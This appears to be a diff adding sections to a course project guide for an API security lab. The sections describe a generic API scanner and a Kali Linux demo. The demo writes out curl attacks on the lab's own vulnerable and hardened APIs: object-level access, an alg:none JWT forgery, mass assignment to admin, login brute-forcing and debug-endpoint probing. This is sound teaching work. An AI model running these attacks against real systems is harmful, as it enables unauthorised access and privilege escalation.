@@ -138,6 +138,14 @@ tr:nth-child(even) td{background:#f6f8fa}
     <a href="#s12"><span>8. How to Start and Stop</span><span>17</span></a>
     <a href="#s13"><span>9. Demonstration Workflows</span><span>18</span></a>
     <a href="#s14"><span>10. Likely Lecturer Questions &amp; Answers</span><span>19</span></a>
+    <a href="#s15"><span>11. Generic API Scanner (/scan-ui)</span><span>24</span></a>
+    <a href="#s15a" class="toc-l2"><span>11.1 Authentication Modes</span><span>24</span></a>
+    <a href="#s15b" class="toc-l2"><span>11.2 Pre-scan Validation</span><span>25</span></a>
+    <a href="#s15c" class="toc-l2"><span>11.3 Presets</span><span>25</span></a>
+    <a href="#s16"><span>12. Kali Linux Attack Demonstrations</span><span>26</span></a>
+    <a href="#s16a" class="toc-l2"><span>12.1 Network Setup</span><span>26</span></a>
+    <a href="#s16b" class="toc-l2"><span>12.2 Vulnerable API Attack Commands</span><span>26</span></a>
+    <a href="#s16c" class="toc-l2"><span>12.3 Hardened API Attack Commands</span><span>27</span></a>
   </div>
 </div>
 
@@ -945,6 +953,20 @@ python demo.py</pre>
   <strong>Why it uses port 9000:</strong> The script routes all requests through the monitoring proxy at <code>http://localhost:9000/auth/login</code>. Hardened-API requests include the header <code>X-Target: hardened</code> which the proxy reads and internally forwards to port 8001. Direct access to port 8001 would bypass the proxy and nothing would appear on the dashboard.
 </div>
 
+<h2 class="sub">Workflow F — Kali Linux Live Attack Demo</h2>
+<p>This workflow runs the same attacks from Kali Linux using standard command-line tools, demonstrating that the vulnerable API is exploitable by a real external attacker, not just by purpose-built scripts. Kali runs in VMware NAT — it reaches the host machine at <code>192.168.145.1</code>. All traffic goes through port 9000 so it appears on the dashboard.</p>
+<ol>
+  <li>Ensure containers are running: <code>docker compose up -d</code></li>
+  <li>Open the dashboard at <code>http://localhost:9000/dashboard</code> and click <strong>Reset Logs</strong></li>
+  <li>Open Kali terminal and confirm connectivity: <code>curl -s http://192.168.145.1:9000/monitor/health</code></li>
+  <li>Run the vulnerable API attack block (see Section 12.2) — watch each attack land on the dashboard in real time</li>
+  <li>Repeat using the hardened API block (see Section 12.3, adds <code>-H "X-Target: hardened"</code> to every request) — show each attack being blocked</li>
+  <li>Point to the Anomalies tab — each attack category has a corresponding reason code and score</li>
+</ol>
+<div class="callout callout-warn">
+  <strong>Routing rule applies from Kali too:</strong> Use <code>192.168.145.1:9000</code> for all requests — not port 8000 or 8001. The proxy is the only path to dashboard visibility regardless of where the client runs.
+</div>
+
 <!-- ═══════════════════════════════════════════
      SECTION 10 — Q&A
 ═══════════════════════════════════════════ -->
@@ -1048,6 +1070,210 @@ python demo.py</pre>
 <div class="qa-item">
   <div class="qa-q">Could someone deploy the hardened API in production? What is still missing?</div>
   <div class="qa-a">The hardened API demonstrates the fixes for the six covered vulnerabilities, but it is a demonstration tool, not a production-ready system. Missing for production: persistent database (PostgreSQL/MySQL), HTTPS/TLS termination, input sanitisation beyond Pydantic validation, password reset flows, email verification, account lockout after failed attempts (beyond rate limiting by IP), proper logging and audit trails, secrets rotation, container non-root user, health checks with restart policies, and horizontal scaling considerations. It also uses an in-memory user store that resets on restart. The purpose is to show the security concepts, not to be a deployable product.</div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     SECTION 11 — GENERIC API SCANNER
+═══════════════════════════════════════════ -->
+<h1 class="section" id="s15">11. Generic API Scanner (/scan-ui)</h1>
+<p>In addition to the automated testing engine (which is hard-coded to the lab APIs), the monitoring service hosts a <strong>generic black-box scanner</strong> at <code>http://localhost:9000/scan-ui</code>. It can scan any REST or GraphQL API — including external APIs and the lab APIs — for the same six OWASP categories. Scans run server-side inside the monitoring container; results appear on screen with CVE references and remediation guidance.</p>
+
+<h2 class="sub" id="s15a">11.1 Authentication Modes</h2>
+<p>The scanner supports five authentication methods to accommodate different API designs:</p>
+<table>
+  <tr><th>Mode</th><th>How it works</th><th>Typical use case</th></tr>
+  <tr><td><strong>Login Flow</strong></td><td>POSTs credentials to an auth endpoint, extracts a token from the JSON response using a configurable field name, then sends <code>Authorization: Bearer {token}</code> on subsequent requests</td><td>The lab APIs, most REST APIs with session tokens</td></tr>
+  <tr><td><strong>Bearer Token</strong></td><td>Accepts a pre-existing JWT or opaque token; sends it directly as <code>Authorization: Bearer {token}</code></td><td>APIs where you already have a token from another tool</td></tr>
+  <tr><td><strong>API Key Header</strong></td><td>Sends a configurable header name and value (e.g. <code>X-API-Key: sk-...</code>) with every request</td><td>GitHub API (<code>Authorization: Bearer ghp_...</code>), internal APIs</td></tr>
+  <tr><td><strong>Query Param</strong></td><td>Appends a configurable parameter to every request URL (e.g. <code>?key=AIzaSy...</code>)</td><td>Google APIs (Gemini, Maps, YouTube Data API)</td></tr>
+  <tr><td><strong>Basic Auth</strong></td><td>Encodes <code>username:password</code> as Base64 and sends <code>Authorization: Basic {encoded}</code></td><td>APIs using HTTP Basic Authentication</td></tr>
+  <tr><td><strong>None</strong></td><td>No credentials — only unauthenticated tests run (CORS, security headers, schema exposure, rate-limit probing, debug paths, JWT forgery attempts)</td><td>Public APIs, or checking the unauthenticated attack surface only</td></tr>
+</table>
+
+<p>An <strong>Extra Headers</strong> field accepts arbitrary JSON headers sent with every request, for APIs that require custom headers like <code>X-Tenant-ID</code>, <code>X-Api-Version</code>, or <code>X-Workspace</code>.</p>
+
+<h2 class="sub" id="s15b">11.2 Pre-scan Validation</h2>
+<p>Before running any OWASP tests, the scanner performs two validation checks:</p>
+<ol>
+  <li><strong>Reachability check:</strong> Probes the root path (<code>/</code> then empty string) to confirm the target is online. If unreachable, the scan is aborted immediately with a clear error rather than running 20+ tests that all time out.</li>
+  <li><strong>Auth credential validation:</strong> Finds an endpoint that requires authentication (by first probing without credentials — if a 200 is returned with no auth, that endpoint is public and cannot be used to validate credentials). Once an auth-gated endpoint is found, it probes with the supplied credentials. A 401 response means the credentials are invalid; 200 or 403 means they are accepted. Tests that require valid credentials are skipped if credentials fail validation.</li>
+</ol>
+<p>The pre-scan result is shown as a banner at the top of every scan result: a green tick for reachable and valid credentials, a red cross for unreachable or invalid credentials, and a grey indicator if no credentials were provided.</p>
+
+<h2 class="sub" id="s15c">11.3 Presets</h2>
+<table>
+  <tr><th>Preset</th><th>Target</th><th>Auth mode</th><th>Use case</th></tr>
+  <tr><td><strong>Vulnerable API (lab)</strong></td><td>http://vulnerable-api:8000</td><td>Login Flow (alice/alice123)</td><td>Default lab demo — all six OWASP categories, all expected to be vulnerable</td></tr>
+  <tr><td><strong>Hardened API (lab)</strong></td><td>http://hardened-api:8001</td><td>Login Flow (alice/alice123)</td><td>Comparison — all six categories, all expected to be secure</td></tr>
+  <tr><td><strong>Google Gemini API</strong></td><td>https://generativelanguage.googleapis.com</td><td>Query Param (<code>key=...</code>)</td><td>External API demo — paste your AI Studio key into the Query Param value field</td></tr>
+  <tr><td><strong>GraphQL API</strong></td><td>(enter target)</td><td>Bearer Token</td><td>GraphQL-specific tests: introspection, batch queries, field suggestion, depth limits</td></tr>
+  <tr><td><strong>External REST API</strong></td><td>(enter target)</td><td>Login Flow</td><td>Blank template for any external REST API</td></tr>
+</table>
+
+<div class="callout callout-info">
+  <strong>Getting a Google AI Studio API key:</strong> Go to <code>aistudio.google.com</code> → sign in → click <em>Get API key</em> in the left sidebar → <em>Create API key</em> → copy the key (format: <code>AIzaSy...</code>). Select the <em>Google Gemini API</em> preset in the scanner, paste the key into the Query Param value field, and run the scan. The scanner probes the <code>/v1beta/models</code> endpoint family.
+</div>
+
+<!-- ═══════════════════════════════════════════
+     SECTION 12 — KALI LINUX
+═══════════════════════════════════════════ -->
+<h1 class="section" id="s16">12. Kali Linux Attack Demonstrations</h1>
+<p>Kali Linux provides real attacker tools that complement the automated scripts. Running the same attacks from Kali demonstrates that the vulnerable API is exploitable by standard penetration testing tools, not just purpose-built code.</p>
+
+<h2 class="sub" id="s16a">12.1 Network Setup</h2>
+<p>Kali runs in VMware Workstation using a NAT adapter (VMnet8). The Windows host IP on the VMnet8 subnet is the gateway for all Kali traffic:</p>
+<table>
+  <tr><th>Machine</th><th>IP</th><th>Role</th></tr>
+  <tr><td>Kali Linux (VM)</td><td>192.168.145.151</td><td>Attacker</td></tr>
+  <tr><td>Windows host (VMnet8)</td><td>192.168.145.1</td><td>Docker host — all API services reachable here</td></tr>
+</table>
+
+<p><strong>Windows Firewall rules required</strong> (run once in PowerShell as Administrator):</p>
+<pre>New-NetFirewallRule -DisplayName "CY384 Vulnerable API" -Direction Inbound -Protocol TCP -LocalPort 8000 -Action Allow -Profile Any
+New-NetFirewallRule -DisplayName "CY384 Hardened API"   -Direction Inbound -Protocol TCP -LocalPort 8001 -Action Allow -Profile Any
+New-NetFirewallRule -DisplayName "CY384 Monitoring"     -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow -Profile Any</pre>
+
+<p><strong>Connectivity test from Kali:</strong></p>
+<pre>curl -s http://192.168.145.1:9000/monitor/health</pre>
+<p>Expected: JSON showing all three services with status "up".</p>
+
+<div class="callout callout-warn">
+  <strong>All Kali traffic must go through port 9000.</strong> Direct requests to port 8000 or 8001 bypass the monitoring proxy — they will work but will not appear on the dashboard. Use <code>192.168.145.1:9000</code> for all demo traffic. Add <code>-H "X-Target: hardened"</code> to route through the hardened API.
+</div>
+
+<h2 class="sub" id="s16b">12.2 Vulnerable API — Kali Attack Commands</h2>
+<pre># ── Step 1: Get alice's token ─────────────────────────────────────────────
+TOKEN=$(curl -s -X POST http://192.168.145.1:9000/auth/login \\
+  -H "Content-Type: application/json" \\
+  -d '{"username":"alice","password":"alice123"}' | \\
+  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+echo "Token: $TOKEN"
+
+# ── API1: BOLA — alice reads bob's record ─────────────────────────────────
+curl -s http://192.168.145.1:9000/users/2 \\
+  -H "Authorization: Bearer $TOKEN"
+
+# ── API2: JWT Forgery — alg:none bypass ──────────────────────────────────
+HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
+PAYLOAD=$(echo -n '{"sub":"2","username":"bob","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
+FORGED="$HEADER.$PAYLOAD."
+
+curl -s http://192.168.145.1:9000/users/2 \\
+  -H "Authorization: Bearer $FORGED"
+
+# ── API3: Mass Assignment — self-promote to admin ─────────────────────────
+curl -s -X PUT http://192.168.145.1:9000/users/1 \\
+  -H "Authorization: Bearer $TOKEN" \\
+  -H "Content-Type: application/json" \\
+  -d '{"email":"alice@x.com","password":"alice123","role":"admin","balance":999999}'
+
+# ── API4: Rate Limiting — 15 rapid login attempts ─────────────────────────
+for i in $(seq 1 15); do
+  echo -n "Attempt $i: "
+  curl -s -o /dev/null -w "HTTP %{http_code}\\n" \\
+    -X POST http://192.168.145.1:9000/auth/login \\
+    -H "Content-Type: application/json" \\
+    -d '{"username":"alice","password":"wrong"}'
+done
+
+# ── API5: Function Auth — regular user hits admin route ───────────────────
+curl -s http://192.168.145.1:9000/admin/users \\
+  -H "Authorization: Bearer $TOKEN"
+
+# ── API8: Debug endpoint — no auth needed ─────────────────────────────────
+curl -s http://192.168.145.1:9000/debug</pre>
+
+<p><strong>Expected results — Vulnerable API:</strong></p>
+<table>
+  <tr><th>Attack</th><th>Expected HTTP</th><th>Expected body</th><th>Dashboard flag</th></tr>
+  <tr><td>BOLA</td><td>200</td><td>Bob's full profile including email and balance</td><td>bola_object_accessed (-0.8)</td></tr>
+  <tr><td>JWT Forgery</td><td>200</td><td>Bob's profile returned using a hand-crafted token</td><td>bola_object_accessed (-0.8)</td></tr>
+  <tr><td>Mass Assignment</td><td>200</td><td>Response shows role: admin, balance: 999999</td><td>admin_endpoint_access (subsequent)</td></tr>
+  <tr><td>Rate Limit</td><td>401 every attempt</td><td>No 429 — unlimited attempts allowed</td><td>ML unusual_pattern only</td></tr>
+  <tr><td>Function Auth</td><td>200</td><td>Full list of all users including admin</td><td>admin_endpoint_access (-0.7)</td></tr>
+  <tr><td>Debug Endpoint</td><td>200</td><td>JSON with secret_key: "secret", debug_mode: true</td><td>debug_endpoint_access (-0.9)</td></tr>
+</table>
+
+<h2 class="sub" id="s16c">12.3 Hardened API — Kali Attack Commands</h2>
+<p>Identical commands with <code>-H "X-Target: hardened"</code> added to every request:</p>
+<pre># ── Step 1: Get alice's token (hardened) ─────────────────────────────────
+TOKEN_H=$(curl -s -X POST http://192.168.145.1:9000/auth/login \\
+  -H "Content-Type: application/json" \\
+  -H "X-Target: hardened" \\
+  -d '{"username":"alice","password":"alice123"}' | \\
+  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+# ── API1: BOLA attempt (expect 403) ──────────────────────────────────────
+curl -s http://192.168.145.1:9000/users/2 \\
+  -H "Authorization: Bearer $TOKEN_H" \\
+  -H "X-Target: hardened"
+
+# ── API2: JWT Forgery attempt (expect 401 — signature invalid) ────────────
+curl -s http://192.168.145.1:9000/users/2 \\
+  -H "Authorization: Bearer $FORGED" \\
+  -H "X-Target: hardened"
+
+# ── API3: Mass Assignment (expect fields silently ignored) ────────────────
+curl -s -X PUT http://192.168.145.1:9000/users/1 \\
+  -H "Authorization: Bearer $TOKEN_H" \\
+  -H "Content-Type: application/json" \\
+  -H "X-Target: hardened" \\
+  -d '{"email":"alice@x.com","password":"alice123","role":"admin","balance":999999}'
+
+# ── API4: Rate Limiting (expect 429 after 5 attempts) ─────────────────────
+for i in $(seq 1 15); do
+  echo -n "Attempt $i: "
+  curl -s -o /dev/null -w "HTTP %{http_code}\\n" \\
+    -X POST http://192.168.145.1:9000/auth/login \\
+    -H "Content-Type: application/json" \\
+    -H "X-Target: hardened" \\
+    -d '{"username":"alice","password":"wrong"}'
+done
+
+# ── API5: Function Auth (expect 403) ──────────────────────────────────────
+curl -s http://192.168.145.1:9000/admin/users \\
+  -H "Authorization: Bearer $TOKEN_H" \\
+  -H "X-Target: hardened"
+
+# ── API8: Debug endpoint (expect 404) ─────────────────────────────────────
+curl -s http://192.168.145.1:9000/debug \\
+  -H "X-Target: hardened"</pre>
+
+<p><strong>Expected results — Hardened API:</strong></p>
+<table>
+  <tr><th>Attack</th><th>Expected HTTP</th><th>What changed</th></tr>
+  <tr><td>BOLA</td><td>403</td><td>Ownership check: current_user.id != requested_id → Access denied</td></tr>
+  <tr><td>JWT Forgery</td><td>401</td><td>Hardened API validates signature — hand-crafted token rejected</td></tr>
+  <tr><td>Mass Assignment</td><td>200 but role unchanged</td><td>role and balance not in UserUpdate model — silently dropped by Pydantic</td></tr>
+  <tr><td>Rate Limit</td><td>401 × 5, then 429 × 10</td><td>slowapi @limiter.limit("5/minute") enforced by IP</td></tr>
+  <tr><td>Function Auth</td><td>403</td><td>require_admin dependency checks role == "admin" before handler runs</td></tr>
+  <tr><td>Debug Endpoint</td><td>404</td><td>Endpoint does not exist — removed entirely from hardened API</td></tr>
+</table>
+
+<div class="callout callout-good">
+  <strong>Demo tip:</strong> Run the vulnerable block first so the audience sees each attack succeed. Then reset the dashboard logs and run the hardened block. The contrast — same commands, same Kali machine, same port 9000 — but completely different outcomes — is the strongest possible demonstration of defence-in-depth.
+</div>
+
+<!-- New Q&A items for scanner and Kali -->
+<div class="qa-item">
+  <div class="qa-q">What is the generic API scanner at /scan-ui and how does it differ from the testing engine?</div>
+  <div class="qa-a">The testing engine (launched with <code>docker compose run --rm --profile tools testing-engine</code>) is hard-coded to test the lab APIs. It runs inside Docker, knows the internal container names, and cannot be pointed at external APIs. The generic scanner at <code>/scan-ui</code> is a web-based black-box scanner that can target any URL — lab APIs using Docker internal names, or external APIs using full HTTPS URLs. It supports five authentication modes, an API type toggle (REST vs GraphQL), extra headers, and schema discovery. The testing engine is more thorough for the lab APIs; the generic scanner is more flexible for arbitrary targets.</div>
+</div>
+
+<div class="qa-item">
+  <div class="qa-q">Why does Kali need to use port 9000 instead of hitting the API ports directly?</div>
+  <div class="qa-a">Port 9000 is the monitoring proxy — the single chokepoint through which all observable traffic flows. A request from Kali to <code>192.168.145.1:8000</code> reaches the vulnerable API directly, bypassing the proxy entirely. That request is never logged to SQLite, never scored by the anomaly detector, and never appears on the dashboard. The dashboard only shows traffic that the proxy has seen. By routing through <code>192.168.145.1:9000</code>, Kali's attacks pass through the proxy, get logged, scored, and displayed — which is the entire point of the demonstration. The architecture is identical to the shop app: the browser talks to 9000, not 8000 or 8001 directly.</div>
+</div>
+
+<div class="qa-item">
+  <div class="qa-q">Why does the scanner perform a pre-scan validation before running tests?</div>
+  <div class="qa-a">Without pre-scan validation, a typo in the target URL or an incorrect API key would cause every single test to time out silently, taking 20–40 seconds before returning meaningless results. The reachability check aborts the scan immediately if the target is offline. The credential validation probe finds an auth-gated endpoint (by first checking without credentials — any endpoint that returns 200 with no auth is public and cannot be used to validate credentials) and confirms credentials work before running the 20+ tests that depend on them. If credentials are invalid, auth-dependent tests are skipped entirely rather than running and returning false results. This makes the scanner significantly more useful against external APIs where the target behaviour is unknown in advance.</div>
+</div>
+
+<div class="qa-item">
+  <div class="qa-q">How does Kali's VMware NAT network reach the Docker containers on Windows?</div>
+  <div class="qa-a">Docker Desktop on Windows binds exposed ports to <code>0.0.0.0</code> (all interfaces) by default. This means ports 8000, 8001, and 9000 are listening on every network interface on the Windows host — including the VMnet8 virtual interface at <code>192.168.145.1</code>. Kali, on the same VMnet8 subnet at <code>192.168.145.151</code>, can reach the Windows host at <code>192.168.145.1</code>. The only obstacle is Windows Defender Firewall, which blocks inbound connections on those ports by default. Adding inbound allow rules for TCP ports 8000, 8001, and 9000 is sufficient. No changes are needed to Docker or to the VMware network adapter configuration.</div>
 </div>
 
 </div><!-- end .content -->
